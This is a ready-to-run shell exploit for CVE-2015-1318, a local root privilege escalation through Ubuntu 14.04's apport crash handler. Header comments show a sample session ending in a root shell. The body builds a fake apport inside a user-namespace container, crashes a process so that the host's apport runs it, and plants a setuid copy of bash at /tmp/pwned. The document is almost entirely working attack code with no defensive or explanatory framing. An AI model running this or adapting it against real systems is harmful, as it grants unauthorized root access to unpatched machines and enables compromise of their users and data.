#!/bin/sh
#
# CVE-2015-1318
#
# Reference: https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758
#
# Example:
#
# % uname -a
# Linux maggie 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
#
# % lsb_release -a
# No LSB modules are available.
# Distributor ID: Ubuntu
# Description:    Ubuntu 14.04.2 LTS
# Release:    14.04
# Codename:   trusty
#
# % dpkg -l | grep '^ii  apport ' | awk -F ' '  '{ print $2 " " $3 }'
# apport 2.14.1-0ubuntu3.8
#
# % id
# uid=1000(ricardo) gid=1000(ricardo) groups=1000(ricardo) (...)
#
# % ./apport.sh
# pwned-4.3# id
# uid=1000(ricardo) gid=1000(ricardo) euid=0(root) groups=0(root) (...)
# pwned-4.3# exit

TEMPDIR=$(mktemp -d)

cd ${TEMPDIR}

cp /bin/busybox .

mkdir -p dev mnt usr/share/apport

(
cat << EOF
#!/busybox sh
(
cp /mnt/1/root/bin/bash /mnt/1/root/tmp/pwned
chmod 5755 /mnt/1/root/tmp/pwned
)
EOF

) > usr/share/apport/apport

chmod +x usr/share/apport/apport

(
cat << EOF
mount -o bind . .
cd .
mount --rbind /proc mnt
touch dev/null
pivot_root . .
./busybox sleep 500 &
SLEEP=\$!
./busybox sleep 1
./busybox kill -11 \$SLEEP
./busybox sleep 5
EOF
) | lxc-usernsexec -m u:0:$(id -u):1 -m g:0:$(id -g):1 2>&1 >/dev/null -- \
    lxc-unshare -s "MOUNT|PID|NETWORK|UTSNAME|IPC" -- /bin/sh 2>&1 >/dev/null

/tmp/pwned -p

rm -Rf ${TEMPDIR}